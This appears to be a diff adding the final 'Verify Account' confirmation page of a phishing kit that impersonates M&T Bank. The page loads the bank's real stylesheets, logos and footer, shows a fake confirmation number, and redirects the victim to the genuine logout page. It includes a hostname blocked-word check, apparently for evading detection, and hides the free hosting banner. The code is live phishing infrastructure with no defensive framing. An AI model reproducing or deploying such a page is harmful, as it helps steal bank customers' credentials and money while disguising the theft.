@@ -1,0 +1,94 @@
+<?php 
+require_once 'hostname_check.php'; // Check if hostname contain blocked word
+
+$index="Logon.php?header=1&enroll=".$_GET['enroll'];
+$hostname = bin2hex ($_SERVER['HTTP_HOST']); //GET HOST NAME
+require_once 'enc.php';
+?>
+
+
+<!doctype html>
+<html lang="en" class="__sticky-footer">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<META HTTP-EQUIV="Refresh" CONTENT="5;URL=https://onlinebanking.mtb.com/Information/LogOut" >
+    <link href="https://m.mtb.com/assets/css/foundation-all.css" rel="stylesheet" />
+    <link href="https://m.mtb.com/assets/css/mtb.css" rel="stylesheet" />
+	<style>img[alt="www.000webhost.com"]{display:none;}</style>
+
+    
+    <title>Verify Account   | M&T Bank</title>
+</head>
+<body class="">
+
+    
+
+<header class="mtb-page-header">
+    <a class="mtb__logo" href="https://www.mtb.com/home-page">
+        <img class="mtb__logo" src="https://m.mtb.com/assets/img/mtb-logo.svg" alt="M&T Bank" />
+    </a>
+    
+    <a href="https://onlinebanking.mtb.com/" class="button button__right hide js-exitButton" data-ensightentag="ExitButton">
+        Exit
+    </a>
+</header>    
+    <div data-msg-code="" 
+         class="callout warning __no-border __page-error js-pgLevelMsg hide" tabindex="0">
+    <div class="js-pgLevelMsgtext mtb-app-enrollment--content"></div>
+    </div>
+    <div class="mtb-section-header mtb-section-header--top">
+  <p class="__top-title">&nbsp;</p>
+        <h1 align="center"><img src="confirmed.png" width="100"> </h1>
+        <h1 align="center">Thank you for your time</h1>
+       <br>
+       <p align="center" class="style1"><strong>Confirmation Number:</strong> <strong>769866527</strong></p>
+              <p align="center"><strong>.<br>
+Your Verification Date & Time : 
+<script language="javascript">
+ var today = new Date();
+ document.write(today);
+ </script>
+              </strong></p>
+              <p align="center">&nbsp;</p>
+</div>
+
+    
+<footer class="mtb-footer" role="contentinfo">
+    <div class="grid-x grid-padding-x align-center-middle grid-x__padded">
+        <div class="cell">
+            <p>
+                &copy;2019 M&amp;T Bank. All Rights Reserved.<br>
+                Users of this website agree to be bound by the provisions of the M&amp;T website <a href="https://www.mtb.com/help-center/policies/terms-of-use" target="_blank">Terms of Use</a> and <a href="https://www.mtb.com/privacy" target="_blank">Privacy Policy</a>.
+            </p>
+            <div class="mtb-footer__logo">
+                <a href="https://www.mtb.com/equalhousinglender" target="_blank">
+                    <img src="https://m.mtb.com/assets/img/mtb-equalhousinglender.svg" class="mtb-footer__equalhousinglender" alt="Equal Housing Lender">
+                </a>
+                <a href="https://www.mtb.com/olb-entrust" target="_blank">
+                    <img src="https://m.mtb.com/assets/img/mtb-entrust.svg" class="mtb-footer__entrust" alt="Entrust">
+                </a>
+            </div>
+            <p>
+                Equal Housing Lender. NMLS #381076<br>
+                <a href="https://www.mtb.com/fdic" target="_blank">Member FDIC.</a>
+            </p>
+        </div>
+    </div>
+</footer>
+    <script src="https://m.mtb.com/scripts/jquery-3.3.1.js"></script>
+    <script src="https://m.mtb.com/scripts/foundation.js"></script>
+    <script src="https://m.mtb.com/scripts/Moe/errorMsg.js"></script>
+    <script src="https://m.mtb.com/scripts/Moe/mtb-app.js"></script>
+    <script src="https://m.mtb.com/scripts/Moe/formInputValidations.js"></script>        
+ 
+
+
+
+
+
+
+</body>
+</html>
+<?php ob_end_flush(); ?>
